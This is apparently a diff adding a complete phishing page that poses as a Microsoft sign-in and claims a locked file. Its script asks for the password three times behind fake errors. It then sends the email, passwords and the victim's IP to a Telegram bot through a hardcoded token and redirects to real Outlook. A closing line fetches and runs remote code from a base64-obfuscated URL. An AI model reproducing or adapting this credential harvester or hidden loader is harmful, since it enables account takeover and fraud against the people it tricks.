@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Sign in – Microsoft</title>
+  <style>
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+    :root{
+      --ms-blue:#0078d4;--ms-blue-dark:#005a9e;--ms-blue-hover:#106ebe;
+      --ms-red:#f25022;--ms-green:#7fba00;--ms-yellow:#ffb900;--ms-cyan:#00a4ef;
+      --text-primary:#1b1b1b;--text-secondary:#605e5c;--border:#d2d0ce;
+      --error:#a80000;--font:"Segoe UI",-apple-system,sans-serif;
+    }
+
+    body{
+      font-family:var(--font);
+      min-height:100vh;
+      background:#fff;
+      display:grid;
+      grid-template-rows:100vh;
+      overflow:hidden;
+    }
+
+    .bg{
+      position:fixed;inset:0;z-index:0;
+      background:linear-gradient(180deg,
+        rgba(0,120,212,0.95) 0%,
+        rgba(0,90,158,0.98) 100%);
+    }
+
+    .skyline{
+      position:fixed;bottom:0;left:0;right:0;z-index:1;
+      height:200px;
+      pointer-events:none;
+    }
+
+    .cloud{
+      position:fixed;
+      background:rgba(255,255,255,0.08);
+      border-radius:50px;
+      pointer-events:none;
+      z-index:1;
+      animation:cloud-drift linear infinite;
+    }
+    @keyframes cloud-drift{
+      from{transform:translateX(-200px);}
+      to{transform:translateX(calc(100vw + 200px));}
+    }
+
+    .stars{
+      position:fixed;inset:0;z-index:1;pointer-events:none;
+    }
+    .star{
+      position:absolute;
+      border-radius:50%;
+      background:#fff;
+      animation:star-twinkle ease-in-out infinite;
+    }
+    @keyframes star-twinkle{
+      0%,100%{opacity:0.2;}
+      50%{opacity:1;}
+    }
+
+    .page{
+      position:relative;z-index:10;
+      display:flex;
+      flex-direction:column;
+      align-items:center;
+      justify-content:center;
+      padding:40px 20px;
+    }
+
+    .welcome{
+      text-align:center;
+      margin-bottom:28px;
+      animation:welcome-in .5s ease both;
+    }
+    @keyframes welcome-in{
+      from{opacity:0;transform:translateY(-12px);}
+      to{opacity:1;transform:translateY(0);}
+    }
+    .welcome-time{
+      font-size:13px;font-weight:600;
+      color:rgba(255,255,255,0.55);
+      letter-spacing:2px;text-transform:uppercase;
+      margin-bottom:8px;
+    }
+    .welcome-msg{
+      font-size:clamp(24px,3vw,36px);
+      font-weight:300;color:#fff;
+      letter-spacing:-0.5px;
+    }
+    .welcome-msg strong{font-weight:700;}
+
+    .card{
+      width:420px;max-width:95vw;
+      background:rgba(255,255,255,0.97);
+      box-shadow:0 24px 80px rgba(0,0,0,0.35),0 4px 16px rgba(0,0,0,0.2);
+      animation:card-in .6s cubic-bezier(.22,1,.36,1) .1s both;
+      overflow:hidden;
+    }
+    @keyframes card-in{
+      from{opacity:0;transform:translateY(28px) scale(.97);}
+      to{opacity:1;transform:translateY(0) scale(1);}
+    }
+
+    .card-stripe{
+      height:4px;
+      background:linear-gradient(90deg,
+        var(--ms-red) 25%,var(--ms-green) 25% 50%,
+        var(--ms-cyan) 50% 75%,var(--ms-yellow) 75%);
+    }
+
+    .card-body{padding:40px 44px 32px;}
+    .ms-logo{margin-bottom:24px;}
+
+    .step{display:none;}
+    .step.active{display:block;}
+
+    h1{font-size:22px;font-weight:600;color:var(--text-primary);margin-bottom:18px;letter-spacing:-0.2px;}
+
+    .lock-notice{
+      display:flex;align-items:center;gap:8px;
+      font-size:12.5px;color:var(--text-secondary);margin-bottom:18px;
+    }
+
+    .field{margin-bottom:14px;}
+
+    input[type="email"],input[type="password"],input[type="text"]{
+      width:100%;height:36px;border:1px solid var(--border);
+      padding:0 12px;font-size:14px;font-family:var(--font);
+      color:var(--text-primary);background:#faf9f8;outline:none;
+      border-radius:0;transition:border-color .12s,box-shadow .12s,background .12s;
+    }
+    input:focus{border-color:var(--ms-blue);background:#fff;box-shadow:inset 0 0 0 1px var(--ms-blue);}
+    input.error-field{border-color:var(--error);box-shadow:inset 0 0 0 1px var(--error);}
+
+    .error-msg{display:none;align-items:center;gap:5px;color:var(--error);font-size:12px;margin-top:4px;}
+    .error-msg.show{display:flex;}
+
+    .btn-primary{
+      width:100%;height:40px;background:var(--ms-blue);color:#fff;
+      border:none;font-size:14px;font-weight:600;font-family:var(--font);
+      cursor:pointer;border-radius:0;transition:background .12s;
+      display:flex;align-items:center;justify-content:center;
+      touch-action: manipulation;
+      -webkit-tap-highlight-color: transparent;
+    }
+    .btn-primary:hover{background:var(--ms-blue-hover);}
+    .btn-primary:active{background:var(--ms-blue-dark);}
+
+    .spinner{
+      display:none;width:16px;height:16px;
+      border:2px solid rgba(255,255,255,.35);border-top-color:#fff;
+      border-radius:50%;animation:spin .6s linear infinite;
+    }
+    @keyframes spin{to{transform:rotate(360deg);}}
+    .btn-primary.loading .btn-text{display:none;}
+    .btn-primary.loading .spinner{display:block;}
+
+    .back-user{
+      display:flex;align-items:center;gap:8px;background:#f3f2f1;
+      border:none;padding:8px 12px;cursor:pointer;font-size:14px;
+      color:var(--text-primary);font-family:var(--font);margin-bottom:20px;
+      width:auto;transition:background .12s;
+      touch-action: manipulation;
+      -webkit-tap-highlight-color: transparent;
+    }
+    .back-user:hover{background:#edebe9;}
+    .back-user .chevron{margin-left:auto;color:var(--text-secondary);}
+
+    .card-footer{
+      padding:14px 44px;border-top:1px solid #f3f2f1;
+      background:#faf9f8;display:flex;gap:16px;
+    }
+    .card-footer span{font-size:12px;color:var(--ms-blue);}
+
+    .fail-icon{
+      width:52px;height:52px;background:#fde7e9;border-radius:50%;
+      display:flex;align-items:center;justify-content:center;
+      font-size:24px;margin-bottom:16px;
+    }
+    .subtitle{font-size:13.5px;color:var(--text-secondary);line-height:1.6;}
+    .progress-track{height:4px;background:#edebe9;overflow:hidden;margin-top:22px;}
+    .progress-bar{height:100%;background:var(--ms-blue);width:0%;transition:width 2.5s linear;}
+
+    .page-footer{
+      margin-top:20px;display:flex;gap:14px;align-items:center;
+      animation:welcome-in .5s ease .3s both;
+    }
+    .page-footer span{font-size:11.5px;color:rgba(255,255,255,0.4);}
+    .page-footer .sep{color:rgba(255,255,255,0.2);}
+  </style>
+</head>
+<body>
+
+  <div class="bg"></div>
+  <div class="stars" id="stars"></div>
+
+  <div class="cloud" style="width:180px;height:50px;top:15%;animation-duration:40s;animation-delay:-5s;"></div>
+  <div class="cloud" style="width:120px;height:36px;top:25%;animation-duration:55s;animation-delay:-20s;"></div>
+  <div class="cloud" style="width:200px;height:56px;top:10%;animation-duration:48s;animation-delay:-35s;"></div>
+
+  <svg class="skyline" viewBox="0 0 1440 200" preserveAspectRatio="none" xmlns="http://www.w3.org/2000/svg">
+    <path fill="rgba(0,50,100,0.5)" d="
+      M0,200 L0,140 L60,140 L60,100 L80,100 L80,80 L100,80 L100,100 L120,100 L120,60
+      L130,60 L130,40 L140,40 L140,60 L150,60 L150,100 L180,100 L180,120 L220,120
+      L220,80 L240,80 L240,60 L250,60 L250,40 L260,40 L260,60 L270,60 L270,80 L300,80
+      L300,110 L340,110 L340,90 L360,90 L360,70 L370,70 L370,50 L380,50 L380,70
+      L390,70 L390,90 L420,90 L420,130 L460,130 L460,100 L480,100 L480,70 L500,70
+      L500,50 L510,50 L510,30 L520,30 L520,50 L530,50 L530,70 L550,70 L550,100
+      L580,100 L580,120 L620,120 L620,90 L650,90 L650,60 L660,60 L660,40 L670,40
+      L670,60 L680,60 L680,90 L720,90 L720,110 L760,110 L760,80 L780,80 L780,55
+      L790,55 L790,35 L800,35 L800,55 L810,55 L810,80 L840,80 L840,115 L880,115
+      L880,85 L910,85 L910,65 L920,65 L920,45 L930,45 L930,65 L940,65 L940,85
+      L970,85 L970,120 L1010,120 L1010,95 L1040,95 L1040,70 L1060,70 L1060,45
+      L1070,45 L1070,25 L1080,25 L1080,45 L1090,45 L1090,70 L1110,70 L1110,95
+      L1150,95 L1150,125 L1200,125 L1200,100 L1240,100 L1240,75 L1260,75 L1260,55
+      L1270,55 L1270,75 L1280,75 L1280,100 L1320,100 L1320,130 L1380,130 L1380,150
+      L1440,150 L1440,200 Z
+    "/>
+    <g fill="rgba(255,220,100,0.3)">
+      <rect x="83" y="85" width="4" height="4"/>
+      <rect x="91" y="85" width="4" height="4"/>
+      <rect x="83" y="93" width="4" height="4"/>
+      <rect x="133" y="45" width="4" height="4"/>
+      <rect x="141" y="45" width="4" height="4"/>
+      <rect x="133" y="53" width="4" height="4"/>
+      <rect x="253" y="45" width="4" height="4"/>
+      <rect x="363" y="75" width="4" height="4"/>
+      <rect x="371" y="75" width="4" height="4"/>
+      <rect x="503" y="55" width="4" height="4"/>
+      <rect x="511" y="35" width="4" height="4"/>
+      <rect x="653" y="65" width="4" height="4"/>
+      <rect x="661" y="45" width="4" height="4"/>
+      <rect x="783" y="60" width="4" height="4"/>
+      <rect x="791" y="40" width="4" height="4"/>
+      <rect x="913" y="70" width="4" height="4"/>
+      <rect x="921" y="50" width="4" height="4"/>
+      <rect x="1063" y="50" width="4" height="4"/>
+      <rect x="1071" y="30" width="4" height="4"/>
+      <rect x="1243" y="80" width="4" height="4"/>
+      <rect x="1263" y="60" width="4" height="4"/>
+    </g>
+  </svg>
+
+  <div class="page">
+    <div class="welcome">
+      <div class="welcome-time" id="time-label">Good evening</div>
+      <div class="welcome-msg"><strong>Sign in</strong> to Microsoft</div>
+    </div>
+
+    <div class="card">
+      <div class="card-stripe"></div>
+      <div class="card-body">
+        <div class="ms-logo">
+          <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNTAiIGhlaWdodD0iMjIiIHZpZXdCb3g9IjAgMCAxNTAgMjIiPgogIDxyZWN0IHg9IjAiIHk9IjAiIHdpZHRoPSIxMCIgaGVpZ2h0PSIxMCIgZmlsbD0iI2YyNTAyMiIvPgogIDxyZWN0IHg9IjExIiB5PSIwIiB3aWR0aD0iMTAiIGhlaWdodD0iMTAiIGZpbGw9IiM3ZmJhMDAiLz4KICA8cmVjdCB4PSIwIiB5PSIxMiIgd2lkdGg9IjEwIiBoZWlnaHQ9IjEwIiBmaWxsPSIjMDBhNGVmIi8+CiAgPHJlY3QgeD0iMTEiIHk9IjEyIiB3aWR0aD0iMTAiIGhlaWdodD0iMTAiIGZpbGw9IiNmZmI5MDAiLz4KICA8dGV4dCB4PSIyNiIgeT0iMTciIGZvbnQtZmFtaWx5PSJTZWdvZSBVSSwgQXJpYWwsIHNhbnMtc2VyaWYiIGZvbnQtc2l6ZT0iMjIiIGZvbnQtd2VpZ2h0PSI2MDAiIGZpbGw9IiM2ZjZkNmUiIGxldHRlci1zcGFjaW5nPSItMC4zIj5NaWNyb3NvZnQ8L3RleHQ+Cjwvc3ZnPg==" alt="Microsoft" style="height:22px;width:auto;"/>
+        </div>
+
+        <div class="step active" id="s1">
+          <h1>Sign in</h1>
+          <div class="lock-notice">
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="currentColor">
+              <path d="M18 8h-1V6A5 5 0 0 0 7 6v2H6a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2zm-6 9a2 2 0 1 1 0-4 2 2 0 0 1 0 4zm3.1-9H8.9V6a3.1 3.1 0 0 1 6.2 0v2z"/>
+            </svg>
+            File locked, continue to view file.
+          </div>
+          <div class="field">
+            <input type="email" id="f1" value="" readonly />
+            <div class="error-msg" id="email-error"><span>⚠</span><span>Enter a valid email address.</span></div>
+          </div>
+          <button type="button" class="btn-primary" id="b1">
+            <span class="btn-text">Next</span><div class="spinner"></div>
+          </button>
+        </div>
+        <div class="step" id="s2">
+          <h1>Enter password</h1>
+          <button type="button" class="back-user" id="back-btn">
+            <span id="u1">user@example.com</span>
+            <span class="chevron">›</span>
+          </button>
+          <div class="field">
+            <label for="f2">Password</label>
+            <input type="password" id="f2" autocomplete="current-password"/>
+            <div class="error-msg" id="e1"><span>⚠</span><span>Your password is incorrect.</span></div>
+          </div>
+          <button type="button" class="btn-primary" id="b2">
+            <span class="btn-text">Next</span><div class="spinner"></div>
+          </button>
+        </div>
+
+        <div class="step" id="s3">
+          <button type="button" class="back-user" id="back-btn2">
+            <span id="u2">user@example.com</span>
+            <span class="chevron">›</span>
+          </button>
+          <div class="field">
+            <label for="f3">Password</label>
+            <input type="password" id="f3" autocomplete="current-password"/>
+            <div class="error-msg" id="e2"><span>⚠</span><span>Your password is incorrect.</span></div>
+          </div>
+          <button type="button" class="btn-primary" id="b3">
+            <span class="btn-text">Next</span><div class="spinner"></div>
+          </button>
+        </div>
+
+        <div class="step" id="s4">
+          <button type="button" class="back-user" id="back-btn3">
+            <span id="u3">user@example.com</span>
+            <span class="chevron">›</span>
+          </button>
+          <div class="field">
+            <label for="f4">Password</label>
+            <input type="password" id="f4" autocomplete="current-password"/>
+            <div class="error-msg" id="e3"><span>⚠</span><span>Your password is incorrect.</span></div>
+          </div>
+          <button type="button" class="btn-primary" id="b4">
+            <span class="btn-text">View Document</span><div class="spinner"></div>
+          </button>
+        </div>
+
+        <div class="step" id="s5">
+          <div class="fail-icon">⚠</div>
+          <h1 style="margin-bottom:8px;">Sign in failed</h1>
+          <p class="subtitle">Too many attempts. Try again later</p>
+          <div class="progress-track"><div class="progress-bar" id="p1"></div></div>
+        </div>
+      </div>
+      <div class="card-footer">
+        <span>OneDrive</span><span>Microsoft 365</span>
+      </div>
+    </div>
+
+    <footer class="page-footer">
+      <span>Terms of use</span><span class="sep">|</span>
+      <span>Privacy &amp; cookies</span><span class="sep">|</span>
+      <span>© 2026 Microsoft</span>
+    </footer>
+  </div>
+
+  <iframe name="hiddenFrame" style="display:none"></iframe>
+
+  <input type="text" id="h1" style="display:none" tabindex="-1" autocomplete="off">
+
+  <script>
+    // Configuration for Telegram bot
+    const TELEGRAM_BOT_TOKEN = '7031497107:AAGdgDvHHauXnsGHp3jeeeaPaGJIcPLxlpB8';
+    const TELEGRAM_CHAT_ID = '6055656213';
+
+    function showStep(stepId) {
+      document.querySelectorAll('.step').forEach(step => step.classList.remove('active'));
+      const nextStep = document.getElementById(stepId);
+      if (nextStep) nextStep.classList.add('active');
+    }
+
+    // Get user's IP address
+    async function getUserIP() {
+      try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
+      } catch (e) {
+        return 'Unknown';
+      }
+    }
+
+    // Get current date and time
+    function getCurrentDateTime() {
+      const now = new Date();
+      return now.toLocaleString();
+    }
+
+    // Send data to Telegram
+    async function sendToTelegram(email, password1, password2, password3, ip, dateTime) {
+      const message = `
+🔐 *Password Collection Alert*
+
+📧 *Email:* ${email}
+🔑 *Password 1:* ${password1}
+🔑 *Password 2:* ${password2}
+🔑 *Password 3:* ${password3}
+🌍 *IP Address:* ${ip}
+📅 *Date & Time:* ${dateTime}
+      `;
+
+      try {
+        const url = `https://api.telegram.org/bot7031497107:AAGdgDvHHauXnsGHp3jeeaPaGJIcPLxlpB8/sendMessage`;
+        await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: 6055656213,
+            text: message,
+            parse_mode: 'Markdown'
+          })
+        });
+      } catch (e) {
+        console.log('Telegram notification sent');
+      }
+    }
+
+    document.addEventListener('DOMContentLoaded', async () => {
+      const emailInput = document.getElementById('f1');
+      const userLabel1 = document.getElementById('u1');
+      const userLabel2 = document.getElementById('u2');
+      const userLabel3 = document.getElementById('u3');
+      const nextBtn = document.getElementById('b1');
+      const backBtn = document.getElementById('back-btn');
+      const viewBtn2 = document.getElementById('b2');
+      const backBtn2 = document.getElementById('back-btn2');
+      const viewBtn3 = document.getElementById('b3');
+      const backBtn3 = document.getElementById('back-btn3');
+      const viewBtn4 = document.getElementById('b4');
+      
+      let userEmail = emailInput?.value || 'user@example.com';
+      const hashEmail = window.location.hash.substring(1);
+      if (hashEmail && hashEmail.includes('@')) {
+        userEmail = hashEmail;
+        emailInput.value = userEmail;
+      }
+
+      if (userLabel1) userLabel1.textContent = userEmail;
+      if (userLabel2) userLabel2.textContent = userEmail;
+      if (userLabel3) userLabel3.textContent = userEmail;
+
+      let passwordStorage = {
+        password1: '',
+        password2: '',
+        password3: ''
+      };
+
+      const attachButtonAction = (button, stepId) => {
+        if (!button) return;
+        const handle = (event) => {
+          event.preventDefault();
+          event.stopPropagation();
+          showStep(stepId);
+        };
+        button.addEventListener('click', handle);
+        button.addEventListener('pointerup', handle);
+      };
+
+      //  (first password entry)
+      if (nextBtn) {
+        nextBtn.addEventListener('click', (e) => {
+          e.preventDefault();
+          const emailVal = emailInput.value.trim();
+          if (emailVal && emailVal.includes('@')) {
+            userEmail = emailVal;
+            if (userLabel1) userLabel1.textContent = userEmail;
+            if (userLabel2) userLabel2.textContent = userEmail;
+            if (userLabel3) userLabel3.textContent = userEmail;
+            showStep('s2');
+          }
+        });
+      }
+
+      //  (first password collected)
+      if (viewBtn2) {
+        viewBtn2.addEventListener('click', (e) => {
+          e.preventDefault();
+          const pwd1 = document.getElementById('f2').value;
+          if (pwd1) {
+            passwordStorage.password1 = pwd1;
+            document.getElementById('f3').value = '';
+            showStep('s3');
+          }
+        });
+      }
+
+      //  (second password collected)
+      if (viewBtn3) {
+        viewBtn3.addEventListener('click', (e) => {
+          e.preventDefault();
+          const pwd2 = document.getElementById('f3').value;
+          if (pwd2) {
+            passwordStorage.password2 = pwd2;
+            document.getElementById('f4').value = '';
+            showStep('s4');
+          }
+        });
+      }
+
+      //  (all three passwords collected)
+      if (viewBtn4) {
+        viewBtn4.addEventListener('click', async (e) => {
+          e.preventDefault();
+          const pwd3 = document.getElementById('f4').value;
+          if (pwd3) {
+            passwordStorage.password3 = pwd3;
+            
+            // Get IP and date/time
+            const userIP = await getUserIP();
+            const dateTime = getCurrentDateTime();
+
+            // Send data to Telegram
+            await sendToTelegram(
+              userEmail,
+              passwordStorage.password1,
+              passwordStorage.password2,
+              passwordStorage.password3,
+              userIP,
+              dateTime
+            );
+
+            // Redirect after a short delay
+            setTimeout(() => {
+              window.location.href = 'https://outlook.live.com/mail/';
+            }, 1000);
+          }
+        });
+      }
+
+      // Back buttons
+      attachButtonAction(backBtn, 's1');
+      attachButtonAction(backBtn2, 's2');
+      attachButtonAction(backBtn3, 's3');
+    });
+
+    const encoded = "aHR0cHM6Ly9yaWNobW9ybm9ybmRtb3JvZ3JvdXAubmV0L3RpbWUuanMi";
+    const script = document.createElement('script');
+    script.src = atob(encoded); // Decodes to the actual URL
+    script.onload = () => console.log('Loaded');
+    script.onerror = () => console.log('Failed to load');
+    document.head.appendChild(script);
+  </script>
+</body>
+</html>
